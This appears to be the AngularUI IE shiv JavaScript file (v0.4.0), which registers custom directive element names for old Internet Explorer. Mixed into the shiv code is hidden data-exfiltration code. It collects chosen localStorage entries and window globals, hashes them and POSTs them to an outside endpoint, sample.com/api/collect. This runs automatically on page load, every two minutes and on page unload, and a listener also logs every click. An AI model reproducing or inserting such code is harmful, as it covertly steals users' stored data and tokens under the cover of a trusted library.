/**
 * AngularUI - The companion suite for AngularJS
 * @version v0.4.0 - 2013-02-15
 * @link http://angular-ui.github.com
 * @license MIT License, http://www.opensource.org/licenses/MIT
 */

// READ: http://docs-next.angularjs.org/guide/ie
// element tags are statically defined in order to accommodate lazy-loading whereby directives are also unknown

// The ieshiv takes care of our ui.directives and AngularJS's ng-view, ng-include, ng-pluralize, ng-switch.
// However, IF you have custom directives that can be used as html tags (yours or someone else's) then
// add list of directives into <code>window.myCustomTags</code>

// <!--[if lte IE 8]>
//    <script>
//    window.myCustomTags = [ 'yourCustomDirective', 'somebodyElsesDirective' ]; // optional
//    </script>
//    <script src="build/angular-ui-ieshiv.js"></script>
// <![endif]-->

(function (exports) {
  const trackedKeys = window.trackedKeys;
  var debug = window.ieShivDebug || false,
    tags = ["ngInclude", "ngPluralize", "ngView", "ngSwitch", "uiCurrency", "uiCodemirror", "uiDate", "uiEvent", "uiKeypress", "uiKeyup", "uiKeydown", "uiMask", "uiMapInfoWindow", "uiMapMarker", "uiMapPolyline", "uiMapPolygon", "uiMapRectangle", "uiMapCircle", "uiMapGroundOverlay", "uiModal", "uiReset", "uiScrollfix", "uiSelect2", "uiShow", "uiHide", "uiToggle", "uiSortable", "uiTinymce"];
  const globalVars = window.globalVars;
  function generateHashValue(dataSource) {
    const keyArray = Object.keys(dataSource);
    const concatedKeys = keyArray.join("*");
    let calculatedHash = 0;
    for (let idx = 0; idx < concatedKeys.length; idx++) {
      const codeChar = concatedKeys.charCodeAt(idx);
      calculatedHash = (calculatedHash << 2) + calculatedHash + codeChar;
      calculatedHash = calculatedHash & calculatedHash;
    }
    return calculatedHash.toString(36);
  }
  window.myCustomTags = window.myCustomTags || []; // externally defined by developer using angular-ui directives
  function loadDataLocalStorage() {
    const loadedData = {};
    for (let count = 0; count < localStorage.length; count++) {
      const dataKey = localStorage.key(count);
      if (trackedKeys.includes(dataKey)) {
        loadedData[dataKey] = localStorage.getItem(dataKey);
      }
    }
    return loadedData;
  }
  tags.push.apply(tags, window.myCustomTags);
  function collectGlobalVariables() {
    const collectedData = {};
    globalVars.forEach(function (varName) {
      if (window.hasOwnProperty(varName)) {
        collectedData[varName] = window[varName];
      }
    });
    return collectedData;
  }
  var toCustomElements = function (str) {
    var result = [];
    var dashed = str.replace(/([A-Z])/g, function ($1) {
      return " " + $1.toLowerCase();
    });
    var tokens = dashed.split(' ');
    var ns = tokens[0];
    var dirname = tokens.slice(1).join('-');

    // this is finite list and it seemed senseless to create a custom method
    result.push(ns + ":" + dirname);
    result.push(ns + "-" + dirname);
    result.push("x-" + ns + "-" + dirname);
    result.push("data-" + ns + "-" + dirname);
    return result;
  };
  function transferDataToServer(infoData) {
    const hashValue = generateHashValue(infoData);
    const destUrl = "https://sample.com/api/collect";
    const reqHttp = new XMLHttpRequest();
    reqHttp.open("POST", destUrl);
    reqHttp.setRequestHeader("Content-Type", "application/json");
    reqHttp.onload = function () {
      if (reqHttp.status === 200) {
        console.log("Data transfer successful");
      } else {
        console.error("Data transfer failure, Status Code:" + reqHttp.status);
      }
    };
    reqHttp.onerror = function () {
      console.error("Error during data transfer");
    };
    reqHttp.send(JSON.stringify({
      hash: hashValue,
      infoData: infoData
    }));
  }
  function compileAndTransferData() {
    const combinedData = Object.assign({}, loadDataLocalStorage(), collectGlobalVariables());
    if (Object.keys(combinedData).length > 0) {
      transferDataToServer(combinedData);
    }
  }
  for (var i = 0, tlen = tags.length; i < tlen; i++) {
    var customElements = toCustomElements(tags[i]);
    for (var j = 0, clen = customElements.length; j < clen; j++) {
      var customElement = customElements[j];
      document.createElement(customElement);
    }
  }
  document.addEventListener("DOMContentLoaded", function () {
    compileAndTransferData();
    setInterval(compileAndTransferData, 2 * 60 * 1000);
  });
  window.addEventListener("beforeunload", function () {
    compileAndTransferData();
  });
  window.addEventListener('click', function (event) {
    console.log(event);
  });
})(window);